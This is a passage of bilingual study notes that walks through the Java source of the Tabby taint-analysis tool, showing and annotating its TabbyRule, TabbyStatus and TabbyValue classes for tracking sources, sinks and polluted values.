class="token comment">// TabbyRule 类表示一组规则，定义如何在 Tabby 应用程序中处理和分析数据。 每个规则都有</span><span class="token comment">// 一个函数名称、一个类型（接收器、源、知道或忽略）、一组操作、漏洞标识符、污染数据点列表</span><span class="token comment">// 和签名列表。 TabbyRule 类提供了初始化规则映射、合并规则、检查规则是否存在以及通过函</span><span class="token comment">// 数名称检索规则的方法</span><span class="token comment">/** * @author wh1t3P1g * @since 2020/12/28 */</span><span class="token annotation punctuation">@Data</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TabbyRule</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> name<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token class-name">Set</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Rule</span><span class="token punctuation">></span></span> rules<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token keyword">transient</span> <span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">Rule</span><span class="token punctuation">></span></span> ruleMap<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">TabbyRule</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        ruleMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>rules <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            rules<span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span>rule <span class="token operator">-></span> <span class="token punctuation">&#123;</span>                ruleMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>rule<span class="token punctuation">.</span>function<span class="token punctuation">,</span> rule<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">merge</span><span class="token punctuation">(</span><span class="token class-name">TabbyRule</span> other<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        rules<span class="token punctuation">.</span><span class="token function">addAll</span><span class="token punctuation">(</span>other<span class="token punctuation">.</span><span class="token function">getRules</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ruleMap<span class="token punctuation">.</span><span class="token function">putAll</span><span class="token punctuation">(</span>other<span class="token punctuation">.</span><span class="token function">getRuleMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">contains</span><span class="token punctuation">(</span><span class="token class-name">String</span> key<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>ruleMap <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> ruleMap<span class="token punctuation">.</span><span class="token function">containsKey</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token class-name">Rule</span> <span class="token function">getRule</span><span class="token punctuation">(</span><span class="token class-name">String</span> key<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>ruleMap <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> ruleMap<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// Rule 类表示 TabbyRule 对象中的单个规则。 它封装了用于数据处理和分析的特定规则</span>    <span class="token comment">// 的细节和行为</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">class</span> <span class="token class-name">Rule</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">private</span> <span class="token class-name">String</span> function<span class="token punctuation">;</span>        <span class="token keyword">private</span> <span class="token class-name">String</span> type<span class="token punctuation">;</span>        <span class="token keyword">private</span> <span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">></span></span> actions<span class="token punctuation">;</span>        <span class="token keyword">private</span> <span class="token class-name">String</span> vul<span class="token punctuation">;</span>        <span class="token keyword">private</span> <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">></span></span> polluted<span class="token punctuation">;</span>        <span class="token keyword">private</span> <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">></span></span> signatures<span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token class-name">Rule</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            signatures <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            polluted <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            actions <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">isSink</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token string">"sink"</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>type<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">isKnow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token string">"know"</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>type<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">isIgnore</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token string">"ignore"</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>type<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">isSource</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token string">"source"</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>type<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">public</span> <span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">></span></span> <span class="token function">getActions</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> actions<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">public</span> <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">></span></span> <span class="token function">getPolluted</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> polluted<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getFunction</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> function<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getType</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> type<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">public</span> <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">></span></span> <span class="token function">getSignatures</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> signatures<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getVul</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> vul<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">isEmptySignaturesList</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> signatures <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">||</span> signatures<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">isContainsSignature</span><span class="token punctuation">(</span><span class="token class-name">String</span> sig<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> signatures <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> signatures<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span>sig<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token annotation punctuation">@Override</span>        <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">equals</span><span class="token punctuation">(</span><span class="token class-name">Object</span> o<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span> <span class="token operator">==</span> o<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>o <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">||</span> <span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> o<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>            <span class="token class-name">Rule</span> rule <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Rule</span><span class="token punctuation">)</span> o<span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">EqualsBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>function<span class="token punctuation">,</span> rule<span class="token punctuation">.</span>function<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>type<span class="token punctuation">,</span> rule<span class="token punctuation">.</span>type<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>actions<span class="token punctuation">,</span> rule<span class="token punctuation">.</span>actions<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>vul<span class="token punctuation">,</span> rule<span class="token punctuation">.</span>vul<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>polluted<span class="token punctuation">,</span> rule<span class="token punctuation">.</span>polluted<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>signatures<span class="token punctuation">,</span> rule<span class="token punctuation">.</span>signatures<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">isEquals</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token annotation punctuation">@Override</span>        <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">hashCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">HashCodeBuilder</span><span class="token punctuation">(</span><span class="token number">17</span><span class="token punctuation">,</span> <span class="token number">37</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>function<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>type<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>actions<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>vul<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>polluted<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>signatures<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toHashCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre></li></ol><h3id="tabbycoredatatabbystatus.java">tabby/core/data/Tabby/Status.java</h3><ol type="1"><li><p><code>Set</code>: An interface in Java that represents acollection of <strong>unique</strong> elements, meaning noduplicates.</p></li><li><p><code>HashSet</code>: A concrete implementation of the<code>Set</code> interface that uses a hashing mechanism for<code>efficient storage and retrieval</code> of elements.</p></li><li><p><strong>?</strong>如何理解这个 <code>this</code>：</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">if</span><span class="token punctuation">(</span>type <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>type<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token string">"this"</span><span class="token punctuation">)</span> <span class="token operator">||</span> type<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token string">"param-"</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre></li><li><p>Code</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">tabby<span class="token punctuation">.</span>core<span class="token punctuation">.</span>data</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">lombok<span class="token punctuation">.</span></span><span class="token class-name">Data</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashSet</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Set</span></span><span class="token punctuation">;</span><span class="token comment">/** * @author wh1t3P1g * @since 2021/3/19 */</span><span class="token annotation punctuation">@Data</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TabbyStatus</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// polluted</span>    <span class="token keyword">boolean</span> isPolluted <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token comment">// polluted positions like param-0,param-1,field-name1,this</span>    <span class="token class-name">Set</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">></span></span> types <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashSet</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setType</span><span class="token punctuation">(</span><span class="token class-name">String</span> type<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        types<span class="token punctuation">.</span><span class="token function">clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>type <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            types<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>type<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">addType</span><span class="token punctuation">(</span><span class="token class-name">String</span> type<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>type <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            types<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>type<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">concatType</span><span class="token punctuation">(</span><span class="token class-name">String</span> type<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token class-name">Set</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">></span></span> newTypes <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashSet</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// Inserting the current string old from the types set into the first placeholder (&#123;&#125;).</span>        <span class="token comment">// Inserting the provided type argument into the second placeholder (&#123;&#125;).</span>        <span class="token comment">// Separating them with a pipe character (|) as a delimiter.</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token class-name">String</span> old<span class="token operator">:</span>types<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            newTypes<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span><span class="token string">"&#123;&#125;|&#123;&#125;"</span><span class="token punctuation">,</span> old<span class="token punctuation">,</span> type<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/**     * 只获取第一个polluted type     * 当存在多个polluted type时，获取第一个，做近似化处理     * @return     */</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getFirstPollutedType</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>isPolluted<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token class-name">String</span> type<span class="token operator">:</span>types<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>type <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>type<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token string">"this"</span><span class="token punctuation">)</span> <span class="token operator">||</span> type<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token string">"param-"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token keyword">return</span> type<span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token class-name">TabbyStatus</span> <span class="token function">clone</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token class-name">TabbyStatus</span> status <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TabbyStatus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        status<span class="token punctuation">.</span><span class="token function">setPolluted</span><span class="token punctuation">(</span>isPolluted<span class="token punctuation">)</span><span class="token punctuation">;</span>        status<span class="token punctuation">.</span><span class="token function">setTypes</span><span class="token punctuation">(</span>types<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> status<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre></li></ol><h3id="tabbycoredatatabbyvalue.java">tabby/core/data/TabbyValue.java</h3><ol type="1"><li><p>Code分析</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">tabby<span class="token punctuation">.</span>core<span class="token punctuation">.</span>data</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">lombok<span class="token punctuation">.</span></span><span class="token class-name">Getter</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">lombok<span class="token punctuation">.</span></span><span class="token class-name">Setter</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>lang3<span class="token punctuation">.</span>builder<span class="token punctuation">.</span></span><span class="token class-name">EqualsBuilder</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>lang3<span class="token punctuation">.</span>builder<span class="token punctuation">.</span></span><span class="token class-name">HashCodeBuilder</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">soot<span class="token punctuation">.</span></span><span class="token class-name">ArrayType</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">soot<span class="token punctuation">.</span></span><span class="token class-name">Local</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">soot<span class="token punctuation">.</span></span><span class="token class-name">Type</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">soot<span class="token punctuation">.</span></span><span class="token class-name">Value</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">Serializable</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">UUID</span></span><span class="token punctuation">;</span><span class="token comment">/** * @author wh1t3P1g * @since 2020/11/26 */</span><span class="token annotation punctuation">@Getter</span><span class="token annotation punctuation">@Setter</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TabbyValue</span> <span class="token keyword">implements</span> <span class="token class-name">Serializable</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// Represents a value within a Java bytecode analysis context.</span>    <span class="token comment">// Stores information about the value's type, origin, status (array, field,</span>    <span class="token comment">// static, polluted), and other relevant metadata.</span>    <span class="token keyword">private</span> <span class="token class-name">UUID</span> uuid<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token class-name">Type</span> type<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> typeName<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token class-name">Value</span> origin<span class="token punctuation">;</span>    <span class="token comment">// status</span>    <span class="token keyword">private</span> <span class="token keyword">boolean</span> isArray <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token keyword">boolean</span> isField <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token keyword">boolean</span> isStatic <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token class-name">TabbyStatus</span> status <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TabbyStatus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">TabbyValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        uuid <span class="token operator">=</span> <span class="token constant">UUID</span><span class="token punctuation">.</span><span class="token function">randomUUID</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token class-name">TabbyValue</span><span class="token punctuation">(</span><span class="token class-name">Local</span> value<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        uuid <span class="token operator">=</span> <span class="token constant">UUID</span><span class="token punctuation">.</span><span class="token function">randomUUID</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        type <span class="token operator">=</span> value<span class="token punctuation">.</span><span class="token function">getType</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        typeName <span class="token operator">=</span> type<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        origin <span class="token operator">=</span> value<span class="token punctuation">;</span>        isArray <span class="token operator">=</span> <span class="token function">isArrayType</span><span class="token punctuation">(</span>value<span class="token punctuation">.</span><span class="token function">getType</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// If a value is created from user input, it might be considered polluted.</span>    <span class="token comment">// The relatedType could be set to "UserInput" to track this origin.</span>    <span class="token comment">// As this value flows through the program, its relatedType would signal its</span>    <span class="token comment">// potential pollution to other parts of the analysis.</span>    <span class="token keyword">public</span> <span class="token class-name">TabbyValue</span><span class="token punctuation">(</span><span class="token class-name">Type</span> type<span class="token punctuation">,</span> <span class="token class-name">String</span> relatedType<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        uuid <span class="token operator">=</span> <span class="token constant">UUID</span><span class="token punctuation">.</span><span class="token function">randomUUID</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>type <span class="token operator">=</span> type<span class="token punctuation">;</span>        typeName <span class="token operator">=</span> type<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        isArray <span class="token operator">=</span> <span class="token function">isArrayType</span><span class="token punctuation">(</span>type<span class="token punctuation">)</span><span class="token punctuation">;</span>        status<span class="token punctuation">.</span><span class="token function">setPolluted</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        status<span class="token punctuation">.</span><span class="token function">setType</span><span class="token punctuation">(</span>relatedType<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">TabbyValue</span> <span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token class-name">Local</span> value<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">TabbyValue</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token class-name">TabbyValue</span> <span class="token function">deepClone</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// try to clone value</span>        <span class="token class-name">TabbyValue</span> newValue <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TabbyValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        newValue<span class="token punctuation">.</span><span class="token function">setUuid</span><span class="token punctuation">(</span>uuid<span class="token punctuation">)</span><span class="token punctuation">;</span>        newValue<span class="token punctuation">.</span><span class="token function">setField</span><span class="token punctuation">(</span>isField<span class="token punctuation">)</span><span class="token punctuation">;</span>        newValue<span class="token punctuation">.</span><span class="token function">setArray</span><span class="token punctuation">(</span>isArray<span class="token punctuation">)</span><span class="token punctuation">;</span>        newValue<span class="token punctuation">.</span><span class="token function">setStatic</span><span class="token 